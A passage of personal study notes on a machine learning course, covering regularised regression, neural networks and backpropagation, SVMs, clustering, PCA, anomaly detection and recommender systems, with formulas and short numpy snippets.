a little bit less than one. That mean we\u0026rsquo;re shrinking the parameter a little bit, and then we\u0026rsquo;re performing similar update as before. Mathematically, what it\u0026rsquo;s doing is exactly gradient descent on the cost function $j \\text{ of } \\theta$ that uses the regularization term.\nNormal equation:\nIf you are using regularization, then this formula would add a matrix inside.\nThis new formula for $\\theta$ is one that will give you the global minimum of $j$ of $\\theta$.\nnon-invertibility:\nIf you have fewer examples than feature, then this matrix X transpose X will be non-invertible, or singular(degenerate).\nSo long as the regularization parameter $\\lambda$ \u0026gt;0, it is actually possible to prove that this matrix X transpose X plus parameter times this funny matrix will not be singular.\n7.4 Regularized Logistic Regression $J(\\theta)=\\frac1m\\sum\\limits_{i=1} ^m[-y ^{(i)}\\log( h_\\theta(x ^{(i)}))-(1-y ^{(i)})\\log(1-h_\\theta( x ^{(i)}) )]+\\frac{\\lambda }{2m}\\sum\\limits_{j=1} ^n\\theta_j ^2$\n1 2 3 4 5 6 7 8 9 10 import numpy as np def costReg(theta, X, y, learningRate): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) first = np.multiply(-y, np.log(sigmoid(X*theta.T))) second = np.multiply((1 - y), np.log(1 - sigmoid(X*theta.T))) reg = (learningRate / (2 * len(X))* np.sum(np.power(theta[:,1:theta.shape[1]],2)) return np.sum(first - second) / (len(X)) + reg Repeat until convergence{\n$\\theta_0:=\\theta_0-a\\frac1m\\sum\\limits_{i=1} ^m((h_\\theta(x ^{(i)})-y ^{(i)})x_0 ^{(i)})$\n$\\theta_j:=\\theta_j-a[\\frac1m\\sum\\limits_{i=1} ^m(h_\\theta(x ^{(i)})-y ^{(i)})x_j ^{(i)}+\\frac{\\lambda }{m}\\theta_j]$\n$for$ $j=1,2,\u0026hellip;n$\n}\nThis cosmetically looks identical to what we had for linear regression. But of course is not the same algorithm as we had, because now the hypothesis is defined using $h_\\theta(x)=\\frac1{1+e ^{-\\theta ^Tx}}$.\n8. Neural Networks: Representation 8.1 Non-linear Hypotheses If we were try to learn a nonlinear hypothesis by including all the quadratic features, it was too large to be reasonable. So simple logistic regression together with adding in maybe the quadratic or the cubic features that\u0026rsquo;s just not a good way to learn complex nonlinear hypotheses when n is large, because you just end up with too many features.\nNeural network turns out to be a much better way to learn complex nonlinear hypotheses, even when your input feature space, even when n is large.\n8.2 Neurons and the Brain omitted\n8.3 Model Representation I 8.4 Model Representation II Forward propagation: Vectorized implementation\nThe right part of the picture looks a lot like logistic regression where what we\u0026rsquo;re doing is we\u0026rsquo;re using last node, that\u0026rsquo;s just the logistic regression unit and we\u0026rsquo;re using that to make a prediction h of x. The output $h_\\Theta(x)=g(\\Theta_0 ^{(2)}a_0 ^{(2)}+\\Theta_1 ^{(2)}a_1 ^{(2)}+\\Theta_2 ^{(2)}a_2 ^{(2)}+\\Theta_3 ^{(2)}a_3 ^{(2)})$. $a_0,a_1,a_2,a_3$ are given by three given units. This is awfully like the standard logistic regression model. But where the features fed into logistic regression are these values computed by the hidden layer. Concretely, the function mapping from layer 1 to layer 2, that is determined by some other set of parameters, theta 1.\n8.5 Examples and Intuitions I Neural networks can be used to learn complex nonlinear hypotheses.\nAND function:\nOR function:\nBy taking different set of $\\theta$, a single neurons in a neural network can be used to compute logical function.\n8.6 Examples and Intuitions II 8.7 Multiclass Classification We have 4 logistic regression classifiers, each of which is trying to recognize one of the four classes that we want to distinguish amongst.\n9. Neural Networks: Learning 9.1 Cost Function The cost function we use for the neural network is going to be a generalization of the one that we use for logistic regression.\nLogistic regression:\n$J(\\theta)=-\\frac1m[\\sum_\\limits{i=1} ^{m}y ^{(i)}\\log h_\\theta(x ^{(i)})+(1-y ^{(i)})log(1-h_\\theta(x ^{(i)}))]+\\frac\\lambda {2m}\\sum_\\limits{j=1} ^n\\theta_j ^2$\nNeural network now outputs vectors in $R_K$, where K might be equal to 1 if we have binary classification problem. $(h_\\Theta(x))_i = i^{th} \\text{ output}$. That is h of x is a K dimensional vector. The subscript i just selects out ith element of the vector that is output by the neural network.\nNeural network:\n$J(\\Theta) = -\\frac1m [ \\sum\\limits_{i=1}^m \\sum\\limits_{k=1}^k y_k^{(i)} \\log (h_\\Theta(x^{(i)})) _k + ( 1 - y_k ^{(i)} ) \\log ( 1- ( h_\\Theta ( x^{(i)} ) )_k ) ] + \\frac\\lambda {2m} \\sum\\limits_{l=1}^{L-1} \\sum\\limits_{i=1}^{s_l} \\sum\\limits_{j=1} ^{s_{l+1}} ( \\Theta_{ji} ^{(l)} ) ^2$\n9.2 Backpropagation Algorithm What we\u0026rsquo;d like to do is try to find parameters $\\theta$ to try to minimize $J(\\theta)$.\nThis is our vectorized implementation of forward propagation and allows us compute thee activation values for all the neurons in our neural network.\nNext, in order to compute the derivatives, we\u0026rsquo;re going to use an algorithm called back propagation. The intuition of the back propagation algorithm is that for each node we\u0026rsquo;re going to compute the term $\\delta ^{(l)}_j$ that\u0026rsquo;s going to somehow represent the \u0026ldquo;error\u0026rdquo; of node j in the layer l.\nRecall $a ^{(l)}_j$ does the activation of the j of unit in layer l. So this $\\delta$ term is in some sense going to capture our error in the activation of that neural.\n$\\delta ^{(4)}_j=a ^{(4)}_j-y_j$.\nIf you think of $\\delta$$\\alpha$ and y as vectors then you can take those and come up with a vectorized implementation of it.\n$\\delta ^{(4)}=a ^{(4)}-y$ Here, each of these is a vector whose dimension is equal to the number of output units in out network.\nSo we now got $\\delta ^{(4)}$. What we do next is compute the delta terms for the earlier layers in our network.\nHere\u0026rsquo;s a formula for computing $\\delta(3)$ , $\\delta^{(3)} = (\\Theta ^ {(3)}) ^T\\delta ^{(4)}\\ast g\u0026rsquo;(z ^ {(3)})$. The term g prime of z3, that formally is actually the derivative of the activation function g evaluated at the inputs given by z3. You can get $g\u0026rsquo;(z ^{(3)}) = a ^{(3)}\\ast (1-a ^{(3)})$ if put z3 in sigmoid function.\n$\\delta^{(2)} = (\\Theta ^ {(2)}) ^T\\delta ^{(3)}\\ast g\u0026rsquo;(z ^ {(2)})$ $g\u0026rsquo;(z ^{(2)}) = a ^{(2)}\\ast (1-a ^{(2)})$\nAnd there is no delta 1 term, because the first layer corresponds to the input layer and that\u0026rsquo;s just the feature we observed in our training sets, so that doesn\u0026rsquo;t have any error associated with that.\nThe name back propagation comes from the fact that we start by computing the delta term for the output layer and then we go back a layer and compute the delta terms for the third hidden layer and then we go back another step to compute $\\delta(2)$ and so, we\u0026rsquo;re sort of back propagating the errors from the output layer to layer 3 to layer 2.\nIgnoring lambda or alternatively the regularization term lambda will equal to 0 $\\frac{\\partial}{\\partial\\Theta_{ij} ^{(l)}}J(\\Theta)=a_{j} ^{(l)} \\delta_{i} ^{l+1}$\nSuppose we have a training set of m examples. The first thing we\u0026rsquo;re going to do is to set these $\\delta ^{(l)}_{ij}$. Triangular symbol is the capital Greek alphabet delta. $\\Delta ^{(l)}_{ij}$.\nThe delta is to be used as accumulators that will slowly add things in order to compute these partial derivatives.\nNext we\u0026rsquo;re going to loop through our training set. For the ith iteration, we\u0026rsquo;re going to working with the training example $(x ^{(i)},y ^{(i)})$.\nSet $a ^{(1)} = x ^{(i)}$ and perform forward propagation to compute the activations for all layer $a ^{(l)} l=2,3,\u0026hellip;,L$.\nNext we\u0026rsquo;re going to use output label $y ^{(i)}$ to compute the term for $\\delta ^{(L)}$ for the output there. $\\delta ^{(i)} = a ^{(L)}-y ^{(i)}$.\nThen we\u0026rsquo;re going to use the back propagation algorithm to compute $\\delta ^{(L-1)},\\delta ^{(L-2)},\u0026hellip;,\\delta ^{(2)}$. No delta 1 because we don\u0026rsquo;t associate an error term with the input layer.\n9.3 Backpropagation Intuition Forward propagation:\nBack propagation:\nOne useful intuition is that back propagation is computing these $\\delta ^{(l)}_j$ and we can think of these as the call error of the activation value.\n9.4 Implementation Note Unrolling Parameters Use back propagation to compute the derivatives of your cost function.\nOne implementation detail of unrolling parameters from matrices into vectors. Then you can pass this to an advanced authorization algorithm like fminunc for getting our for a gradient there.\n1 2 3 4 function[jVal,gradient] = costFunction(theta) # gradient-\u0026gt;R^(n+1) theta-\u0026gt;R^(n+1) initialTheta-\u0026gt;R^(n+1) vectors ... optTheta = fminunc(@costFunction, initialTheta, options) 9.5 Gradient Checking When $\\Theta$ is real number\nWhen $\\Theta$ is a vector parameter\nThe top partial derivative of the cost function with respect to every parameter in our network. And we can then take the gradient that we got from back prop.\nCheck that $gradApprox\\approx DVec$ If so, that implementation of back prop is correct.\nThe numerical gradient checking code is a very computationally expensive, a very slow way to try to approximate the derivative. Whereas in contrast, back propagation algorithm is much more computationally efficient way of computing the derivatives. Once you\u0026rsquo;ve verified your implementation of back propagation is corrct, you should turn off gradient checking\n9.6 Random Initialization If set zeros, after each update, $\\Theta$ will always be same. The way to solve is to use random initialization.\n9.7 Putting It Together Pick a network architecture(connectivity pattern between the neurons) Reasonable default 1 hidden layer. The more hidden units in each layer the better(slow) Training a neural network\nRandomly initialize weights Implement forward propagation to get $h_\\Theta(x ^{(i)})$ for any $x ^{(i)}$ Implement code to compute cost function $J(\\Theta)$ Implement backprop to compute all partial derivatives Use gradient checking to compare partial derivatives computed using backpropagation and numerical estimate of gradient of $J(\\Theta)$. Use gradient descent or advanced optimization method with backpropagation to try minimize $J(\\Theta)$ as a function of parameters $\\Theta$. 9.8 Autonomous Driving 10. Advice for Applying Machine Learning 10.1 Deciding What to Try Next When you test your hypothesis on a new set of houses, you find that it makes unacceptably large errors in its predictions. What should you try next?\nGet more training examples Try smaller sets of features Try getting additional features Try adding polynomial features($x ^2_1,x ^2_2,x_1x_2,etc.$) Try decreasing $\\lambda$ Try increasing $\\lambda$ In the next two videos after this, I\u0026rsquo;m going to first talk about how to evaluate learning algorithms.\nIn the next two videos after that, I\u0026rsquo;m going to talk about these techniques which are called the machine learning diagnostics.(A test that you can run to gain insight what is/isnâ€™t working with a learning algorithm, and gain guidance as to how best to improve its performance.)\n10.2 Evaluating a Hypothesis The standard way to evaluate a learned hypothesis is as follows.\nSplit the dataset into training set and test set.\nTypical procedure for how you would train and test the learning algorithm maybe linear regression.\nFirst, Learn parameter $\\Theta$ from training data(minimizing training error $J(\\Theta)$) Compute test set error. Training/testing procedure for logistic regression\nLearn parameter $\\Theta$ for logistic regression Compute test error. Misclassification error (0/1 misclassification error) 10.3 Model Selection and Train Validation Test Sets We will see what \u0026ldquo;Switch data into train, validation and test sets. \u0026quot; are and how to use them to do model selection.\nModel selection: choose a degree of polynomial and fit that model and also get some estimate of how well your fitted hypothesis was generalize to new examples.\nGo over and get all parameters $\\Theta ^1\\Theta ^2\u0026hellip;\\Theta ^{10}$ , look at cross validation set error, see which model has the lowest cross validation set error.\nInstead of using the test set to select the model, we\u0026rsquo;re instead going to use the validation set, or the cross validation set, to select the model.\nUse the test set to measure or to estimate the generalization error of the model that was selected by the algorithm.\n10.4 Diagnosing Bias vs. Variance underfitting problem or an overfitting problem.\nBias(underfit): training error high cross validation error high\nVariance(overfit): training error low cross validation error high\n10.5 Regularization and Bias/Variance How does regularization affect the bias ans variance of a learning algorithm?\nHow can we automatically choose a good value for the regularization parameter $\\lambda$?\nLike in model selection\nchoose different $\\lambda$ minimize the cost function and get parameters vector $\\Theta$ use cross validation set to evaluate them choose the lowest error look at how well it does on the test set You can plot $J_{train}(\\Theta)$ and $J_{cv}(\\Theta)$. When $\\lambda$ is small it would be overfiting(variance), when $\\lambda$ is large it would be lessfiting(bias).\n10.6 Learning Curves Learning curve is a useful tool that can use to diagnose if a physical learning algorithm may be suffering from bias, variance problem or a bit of both.\nHigh bias: If a learning algorithm is suffering from high bias, getting more training data will not(by itself) help much.\nHigh variance: If a learning algorithm is suffering from high variance, getting more training data is likely to help.\nPlotting learning curves like these can often help you figure out if your learning algorithm is suffering bias, or variance or even a little bit of both.\n10.7 Deciding What to Do Next (Revisited) Our original example:\nGet more training examplesâ€”â€”help to fix high variance Try smaller sets of featuresâ€”â€”help to fix high variance Try getting additional featuresâ€”â€”fix high bias problems Try adding polynomial features($x ^2_1,x ^2_2,x_1x_2,etc.$)â€”â€”fix high bias problems Try decreasing $\\lambda$â€”â€”fix high bias Try increasing $\\lambda$â€”â€”fix high variance \u0026ldquo;small\u0026rdquo; neural network has few parameters and more likely to underfitting, the advantage of these small neural networks is that they are computationally cheaper.\n\u0026ldquo;large\u0026rdquo; neural network with either more hidden units(a lot hidden unit in one layer) or with more hidden layers tend to have more parameters and therefore be more prone to overfitting. You can use regularization to address overfitting.\n11. Machine Learning System Design 11.1 prioritizing what to work on: Spam classification example In order to apply supervised learning, the first decision we must make is how do we want to represent x, that is the features of the email.\nIn practice, take most frequently occurring words ( 10,000 to 50,000) in training set, rather than manually pick 100 words.\nSpend your time to make it have low error\nCollect lots of data\nE.g. â€œhoneypotâ€ project. Develop sophisticated features based on email routing information (from email header).\nDevelop sophisticated features for message body, e.g. should â€œdiscountâ€ and â€œdiscountsâ€ be treated as the same word? How about â€œdealâ€ and â€œDealerâ€? Features about punctuation?\nDevelop sophisticated algorithm to detect misspellings (e.g. m0rtgage, med1cine, w4tches.)\n11.2 Error Analysis 11.3 Error Metrics for Skewed Classes If the number of positive examples is much smaller than the number of negative examples, we call it the case of skewed classes.\nFacing this problem, we want to come up with a different error metric or a different evaluation metric. One such evaluation metric are what\u0026rsquo;s called precision/recall.\n1 0 â†Actual clss 1 True Positive(TP) False Positive(FP) Precision 0 False Negative(FN) True Negative(TN) â†‘Predicted class Recall precision: TP/predicted positives = TP/(TP+FP)\nrecall: TP/actual positives = TP/(TP+FN)\n11.4 Trading Off Precision and Recall For many applications, we\u0026rsquo;ll want to somehow control the trade off between precision and recall.\nIf you predict y=1 only if very confident by increase threshold, there will be higher precision and lower recall\nIf you avoid missing too many cases of cancer(FN) by decreasing threshold, there will be higher recall and lower precision\nAverage: $\\frac{P+R}2$ is not a good method to evaluate\nFscore: $2\\frac{PR}{P+R}$ is a better way\n11.5 Data For Machine Learning 12. Support Vector Machines SVM, compared with LR and NN, sometimes gives a cleaner and more powerful way of learning complex nonlinear functions.\n12.1 Optimization Objective replace(simplify) the cost function of LR and make it easier to calculate\nCost function:\nFinally unlike LR, the SVM doesn\u0026rsquo;t output the probability. Instead what we have is this cost function, which we minimize to get parameters $\\theta$. And what SVM does is just makes a prediction of y being equal 1 or 0 directly.\n12.2 Large Margin Intuition Cost function:\nif y=1, we want $\\Theta^Tx\u0026gt;=1$(not just \u0026gt;= 0)\nif y=0, we want $\\Theta^Tx\u0026lt;=-1$(not just \u0026lt; 0)\nThis builds in an extra safety factor or safety margin factor into the SVM.\nLet\u0026rsquo;s see what happens or what the consequences of this are in the context of the SVM.\nIf C is very large, what we need to do is make first term equal to 0.\nIt turns out that when you solve this optimization problem, when you minimize this as a function of the parameters $\\Theta$, you get a very interesting decision boundary.\nIn linearly separable case, the black line is a much better decision boundary than others. mathematically, this line has large distance. That distance is called the margin.\nC like $\\lambda$\nIf C is very large the decision boundary will be sensible to few outliers.\nIf C is not too large, SVM also do fine and reasonable things even your data is not linearly separable.\n12.3 Mathematics Behind Large Margin Classification(optional) Math behind large margin classification\n$u = \\begin{bmatrix}u_1 \\\\ u_2\\end{bmatrix} v=\\begin{bmatrix}v_1 \\\\ v_2\\end{bmatrix}$\nInner product = $u^Tv = u_1v_1+u_2v_2$\n$|u| = \\sqrt{u ^2_1+u ^2_2}$\nOptimization objective = $\\frac12(\\Theta ^2_1+\\Theta ^2_2) = \\frac12(\\sqrt{\\Theta ^2_1+\\Theta ^2_2}) ^2 = \\frac12|\\Theta| ^2$\ns.t. $\\Theta ^Tx ^{(i)}\u0026gt;=1$ if $y ^{(i)}=1$\n$\\Theta ^Tx ^{(i)}\u0026lt;=-1$ if $y ^{(i)}=0$\nso $\\Theta ^Tx ^{(i)} = \\Theta_1x ^{i}_1+\\Theta_2x ^{(i)}_2$\nThe decision boundary and parameters $\\Theta$ are 90 degree orthogonal, we need a small range of parameters $\\Theta$, that mean only when $p^{(i)}$ is big not small, that meet the condition $p^{(i)}\\cdot{\\left| \\theta \\right|}$ \u0026gt;= 1 or \u0026lt;= -1 since $|\\Theta|$ is always positive.\nThe magnitude of the margin is exactly the values of $p ^{(1)}p ^{(2)}p ^{(3)}$ and so on. By making the margin large, SVM can end up with a smaller value for the norm of $\\Theta$, which is what it is trying to do in the objective. And this is why SVM ends up with a large margin classifiers, because it is trying to maximize the norm of these $p ^{(i)}$ which is the distance from the training examples to the decision boundary.\n12.4 Kernels I $f_1=similarity(x,l ^{(1)})=e(-\\frac{|x-l ^{(1)}| ^2}{2\\sigma ^2})$\n$f_2=similarity(x,l ^{(2)})=e(-\\frac{|x-l ^{(2)}| ^2}{2\\sigma ^2})$\n$f_3=similarity(x,l ^{(3)})=e(-\\frac{|x-l ^{(3)}| ^2}{2\\sigma ^2})$\nThese particular choice of similarity function is called Gaussian kernel. But the way the terminology goes is that, in the abstract these different similarity functions are called kernels and we can have different similarity functions and the specific example I\u0026rsquo;m giving here is called Gaussian kernel.\n$If x\\approx l ^{(1)} Then f_1 \\approx e ^{-0} \\approx 1$\nIf x is far from $l ^{(1)}$ Then $f_1=e ^{\\text{-large number} } \\approx 0$\nWe predict 1 when $Î¸_0+Î¸_1f_1+Î¸_2f_2+Î¸_1f_3\u0026gt;=0$\nLet $\\Theta_0=-0.5 \\Theta_1=\\Theta_2=1 \\Theta_3=0$, and we can judge whether the point positive or not.\nFor the purple point $f1=1 f2=0 f3=0$ so $Î¸_0+Î¸_1f_1+Î¸_2f_2+Î¸_1f_3 = -0.5+1 = 0.5 \u0026gt; 0$ . So this point is positive.\nThis is how with the definition of the landmarks and of the kernel function we can learn pretty complex non-linear decision boundary.\n12.5 Kernels II Throw in some of the missing details and also, say a few words about how to use these ideas in practice. Such as, how to pertain to the bias variance trade-off in SVM.\nWhere to get landmarks $l ^{(1)}l ^{(2)}l ^{(3)}$? The idea here is we\u0026rsquo;re gonna take the examples and for every training example, we are just put landmarks as exactly the same locations as the training examples.\nGiven an example x we are going to compute features as $f_1 f_2$ and so on. And these then give me a feature vector. $f = \\begin{bmatrix}f_1 \\\\ f_2 \\\\ \u0026hellip; \\\\ f_m \\end{bmatrix}$ By convention, we can add an $f_0=1$\nHow to choose SVM parameters?:\nC(=$\\frac1\\lambda$) Large C: Lower bias, high variance.\nSmall C: Higher bias, low variance.\n$\\sigma ^2$ in Gaussian kernel: Large $\\sigma ^2$, features f vary more smoothly, higher bias, lower variance.\nSmall $\\sigma ^2$: features f vary less smoothly. lower bias, higher variance.\n12.6 Using An SVM kernel:\nNo kernel(\u0026ldquo;linear kernel\u0026rdquo;) predict \u0026ldquo;y=1\u0026rdquo; if $\\Theta ^Tx\u0026gt;=0$(when n large and m small) Gaussian kernel(when n small m large non-linear boundary) [Note: Do perform feature scaling before using Gaussian kernel] Polynomial Kernel String kernel chi-square kernel histogram intersection kernel Multiclass classification:\nMany SVM packages already have built-in multi-class classification functionality.\nOtherwise, use one-vs.-all method. (Train K SVMs, one to distinguish y=i from the rest, for i=1,2\u0026hellip;k), get $\\Theta ^{(1)}\\Theta ^{(2)}\u0026hellip;\\Theta ^{(K)}$ Pick class i with largest ${\\Theta ^{(i)}} ^Tx$.\nLR vs. SVM:\nIf n is large(relative to m) use LR or SVM without a kernel(\u0026ldquo;linear kernel\u0026rdquo;)\nIf n is small, m is intermediate: use SVM with Gaussian kernel\nIf n is small, m is large: create/add more features, then use LR or SVM without a kernel\nNeural network likely to work well for most if these settings, but may be slower to train.\n13. Clustering 13.1 Unsupervised Learningâ€”â€”Introduction Our first unsupervised learning where we learn unlabeled data instead of labeled data.\n13.2 K-Means Algorithm K-Means Algorithm by far the most popular most widely used clustering algorithm.\nInput:\nK(number of clusters) Training Set{$x ^{(1)} x ^{(2)},\u0026hellip;x ^{(m)}$} STEP:\nRandomly initialize K cluster centroids $\\mu_1\\mu_2\u0026hellip;\\mu_K$\nRepeat:{\nfor i 1 to m: $c ^{(i)} = $index(for 1 to K) of cluster centroid closest to $x ^{(i)}$ [cluster assignment step]\nfor k = 1 to K: $\\mu_k$ = average(mean) of points assigned to cluster k [move centroid step]\n}\nK-means for non-separated clusters\nLike T-shirt sizing problem. You have many body shape and you need to decide how much clusters you need like S,M,L,XL. Then use algorithm to separate them.\n13.3 Optimization Objective $\\mu_{c ^{(i)} }$ = cluster centroid of cluster to which example $x ^{(i)}$ has been assigned\n$x ^{(i)}$ is the training point , we want to minimize the sum of distance between points and cluster centroid\n13.4 Random Initialization Randomly pick K training examples.\nSet $\\mu_1,\u0026hellip;\\mu_k$ equal to these K examples.\nLocal optima:\ninitialize K-means lots of times and run K-means lots of times\nfor ( initialize, run K-means ,compute cost function)\npick clustering that gave lowest cost\n13.5 Choosing the Number of Clusters Elbow method:\nSometimes, you\u0026rsquo;re running K-means to get clusters to use for some later/downstream purpose. Evaluate K=means based on a metric for how well it performs for that later purpose.\n14. Dimensionality Reduction 14.1 Motivation Iâ€”â€” Data Compression Reduce data from 2D to 1D:\nReduce data from 3D to 2D:\nAll these data maybe all of this data maybe lies roughly on the plane. And what we can do with dimensionality reduction is take all of this data and project the data down onto a two dimensional plane.\n14.2 Motivation IIâ€”â€”Visualization Application of dimensionality reductionâ€”â€”visualize the data. For a lot of machine learning applications, it helps us to develop effective learning algorithms. if we can understand our data better, there is some way of visualizing the data better, and so, dimensionality reduction offers us another useful tool to do so.\nIf we can use z1 an z2 to summarizes 50 numbers, then plot these countries in R2 and the understand this sort of features of different countries will be better. What you can do is reduce the data from 50D to 2D. z1 and z2 doesn\u0026rsquo;t astride a physical meaning.\n14.3 Principal Component Analysis Problem Formulation Let try to formulate precisely exactly what we would like PCA to do.\nPCA tries to find a lower-dimensional surface onto which to project the data.\nReduce from 2D to 1D: find a direction onto thich to project the data so as to minimize the projection error.\nReduce from nD to kD: find k vectors onto which to project the data so as to minimize the projection error. (3D to 2D together vectors define a plain or 2D surface)\nPCA\u0026amp;LR\nLR fitting a straight line so as to minimize the squared error between a point and the straight line. Notice we drawing distance vertically(point and the point on the line). PCA tries to minimize the shortest orthogonal distances( point and line)\n14.4 Principal Component Analysis Algorithm Before applying PCA, there is a data pre-processing step which you should always do.\nPreprocessing(features scaling/mean normalization): First compute the mean of each feature $\\mu_j = \\frac1m\\sum ^m_{i=1}x_j ^{(i)}$ and replace each feature $x_j = x_j-\\mu_j$.\nCompute covariance matrix: $\\Sigma = \\frac1m\\sum ^n_{i=1}(x ^{(i)})(x ^{(i)}) ^T$\nCompute eigenvectors: [U,S,V] = svd(Sigma) [svd:singular value decomposition]\nS is a Diagonal matrix.\nU is a NxN dimensional vector, reduce to k dimensional vector\n$z ^{(i)}=U ^T_{reduce}*x ^{(i)}$\n14.5 Choosing The Number Of Principal Components Choosing k(number of principle components)\nAverage squared projection error:\nTotal variation in the data:\nTypically, choose k to be smallest value so that\n$\\frac{\\text{Average squared projection error} } {\\text{Total variation in the data} }\u0026lt;=0.01$ (99% of variance is retained)\nRun SVD once and you get Diagonal matrix, then calculate k.\n$\\frac {\\Sigma ^k_{i=1}s_{ii} }{\\Sigma ^n_{i=1}s_{ii}}\\geq0.99$\n14.6 Reconstruction from Compressed Representation 14.7 Advice for Applying PCA Speedup supervised learning:\n100x100 pictures\nApply PCA and reduce to 1000 dimensional features vectors. Feed new training set to a learning algorithm. For example X, map it through the same mapping that was found by PCA to get corresponding Z and fed to hypothesis and make a prediction. Application of PCA\nCompression(Choose K by percentage of variance retained) Reduce memory/disk needed to store data Speed up learning algorithm Visualization(k=2 or k=3) Bad use of PCA: To prevent over-fitting\nUse $z ^{(i)}$ instead of $x ^{(i)}$ to reduce the number of features to k \u0026lt; n. (fewer features, less likely to over-fit). Actually isn\u0026rsquo;t a good way to address over-fitting. Use regularization instead. Why? PCA throws away some information, reduce dimension of your data without knowing what the values of y is. It might also throw away some valuable information. Use regularization will often gives you at least as good a method for preventing over-fitting.\nOften at very start of a project, someone will just write out a project plan and use PCA inside. How about doing the whole thing without using PCA? Before implementing PCA, first try running whatever you want to do with original/raw data $x ^{(i)}$. Only if that doesn\u0026rsquo;t do what you want, then implement PCA and consider using $z ^{(i)}$.\n15. Anomaly Detection Anomaly Detection is mainly for unsupervised problem, that there\u0026rsquo;s some aspects of it that are also very similar to sort of the supervised learning problem.\n15.1 Problem Motivation Density estimation:\ndataset: {$x ^{(1)},x ^{(2)},x ^{(3)},\u0026hellip;.x ^{(m)}$}\n$if \\quad p(x) \\begin{cases} \u0026lt; \\varepsilon \u0026amp; anomaly \\\\ \u0026gt; =\\varepsilon \u0026amp; normal \\end{cases}$\nAnomaly detection example:\n15.2 Gaussian Distribution Gaussian distribution = Normal distribution\n$x \\sim N(\\mu, \\sigma ^2)$\n$p(x,\\mu,\\sigma ^2)=\\frac{1}{\\sqrt{2\\pi}\\sigma}\\exp\\left(-\\frac{(x-\\mu) ^2}{2\\sigma ^2}\\right)$\n$\\mu=\\frac{1}{m}\\sum\\limits_{i=1} ^{m}x ^{(i)}$\n$\\sigma ^2=\\frac{1}{m}\\sum\\limits_{i=1} ^{m}(x ^{(i)}-\\mu) ^2$\n15.3 Algorithm Apply Gaussian distribution to develop an anomaly detection algorithm.\nGiven dataset $x ^{(1)},x ^{(2)},\u0026hellip;,x ^{(m)}$, which is distributed according to a Gaussian distribution. So $\\mu_j=\\frac1m\\sum\\limits_{i=1} ^mx_j ^{(i)}$ and $\\sigma_j ^2=\\frac1m\\sum\\limits_{i=1} ^m(x_j ^{(i)}-\\mu_j) ^2$. These data may be vectorized versions.\nCompute p(x).\n$p(x)=\\prod\\limits_{j=1} ^np(x_j;\\mu_j,\\sigma_j ^2)=\\prod\\limits_{j=1} ^1\\frac{1}{\\sqrt{2\\pi}\\sigma_j}exp(-\\frac{(x_j-\\mu_j) ^2}{2\\sigma_j ^2})$. It is anomaly if $p(x) \u0026lt; \\epsilon$.\nThe height of this 3-D surface is p(x). To check a point is anomaly or not, we set some very small value for epsilon, and then compute p(x) of the point. If p(x) greater than or equal to epsilon, then we think it is not an anomaly. But if p(x) is smaller then epsilon, that is indeed an anomaly.\n15.4 Developing and Evaluating an Anomaly Detection System How to develop a specific anomaly detection algorithm\nHow to evaluate an anomaly detection algorithm\nAssume we have some labeled data, of anomalous and non-anomalous examples.\nAnd we are going to define a cross validation set and a test set, with which to evaluate a particular anomaly detection algorithm.\nExample:\n10000 good engines and 20 flawed engines\nTraining set: 6000 good engines\nCV: 2000 good engines(y=0) 10 anomalous(y=1)\nTest: 2000 good engines(y=0) 10 anomalous(y=1)\nGet training set and fit p(x)\nEvaluate: It is a very skewed data set, then predicting y equals 0 all the time will have very high classification accuracy. Instead, we should use evaluation metrics like computing the Precision/Recall or do things like compute the F1 score, which is a single real-number way of summarizing the precision and the recall numbers.\nUse cross validation set to choose parameter $\\epsilon$ which maximizes F1 score or the otherwise does well on your cross validation sets.\n15.5 Anomaly Detection vs. Supervised Learning If we have this labeled data, we have some examples that are known to be anomalies and some that are known not to be not anomalies, why don\u0026rsquo;t we just use a supervised learning algorithm, so why don\u0026rsquo;t we just use logistic regression or a neural network to try to learn directly from our labeled data, to predict whether y equals one or y equals zero?\nAnomaly Detection Supervised Learning Very small number of positive examples. Large number of negative examples. Large number of positive and negative examples simultaneously. Many different \u0026ldquo;types\u0026rdquo; of anomalies. Hard for any algorithm to learn from positive examples what the anomalies look like. Enough positive examples for algorithm to get a sense of what positive examples are like. Future anomalies mat look nothing like any of the anomalous examples we\u0026rsquo;ve seen so far. Future positive examples likely to be similar to ones in training set. Examples: Fraud detection, Manufacturing(aircraft engines), Monitoring machines in a data center Examples: Email spam problem, Weather prediction, Cancer classification 15.6 Choosing What Features to Use You have seen the anomaly detection algorithm and we\u0026rsquo;ve talked about how to evaluate an anomaly detection algorithm.\nIt turns out that when you\u0026rsquo;re applying anomaly detection, one of the things that has a huge effect on how well it does, is what features you use, and what features you choose, to give the anomaly detection algorithm.\nTransformations of the data in order to make it look more Gaussian might work a bit better.\nWe can use log function($x = log(x+c), c\u0026gt;=0$) to transform the data, function in python np.log1p = log(x+1)\nError analysis for anomaly detection\nrun on CV and look at the examples it gets wrong and come up with extra features to help algorithm.\nMonitoring computers in a data center\nChoose features that might take on unusually large or small values on the event of an anomaly.\n$x_1$ = memory use of computer\n$x_2$ = number of disk accesses/sec\n$x_3$ = CPU load\n$x_4$ = network traffic\nto check infinite loop, we may need a new feature $x_5 = \\frac{x_3}{x_4}$. this may take on a unusually large value if one of the machines has a very large CPU load but not that much network traffic. So that will help your anomaly detection capture, a certain type of anomaly.\n15.7 Multivariate Gaussian Distribution (Optional) 15.8 Anomaly Detection using the Multivariate Gaussian Distribution (Optional) 16. Recommender Systems 16.1 Problem Formulation Recommender systems is an important application of machine learning.\nThrough recommender systems, will be able to go a little bit into this idea of learning the features.\nRecommender systems look at what books you may have purchased in the past, or what movies you have rated.\nAnd so, our job in developing a recommender system is to come up with a learning algorithm that can automatically go fill in these missing values.\n16.2 Content Based Recommendations If we have features like these then each movie can be represented with a feature vector.\nWe could treat predicting the ratings of each user as a separate linear regression problem.\nFor each user j, learn a parameter $\\Theta ^{(j)} \\in \\mathbb{R} ^3$. Predict user j as rating movie i with $(\\Theta ^{(j)} ) ^Tx ^{(i)}$ stars.\n16.3 Collaborative Filtering we\u0026rsquo;re talking a recommender system that\u0026rsquo;s called collaborative filtering, which start to learn for itself what features to use.\nKnow $\\Theta$ in advance, we can get the features X since $(\\Theta ^{(j)} ) ^Tx ^{(i)} = movie ratings$.\n16.4 Collaborative Filtering Algorithm Initialize $x ^{(1)}\u0026hellip;x ^{(n_m)},\\Theta ^{(1)}\u0026hellip;\\Theta ^{(n_m)}$ to small random values. Minimize $J(x ^{(1)}\u0026hellip;x ^{(n_m)},\\Theta 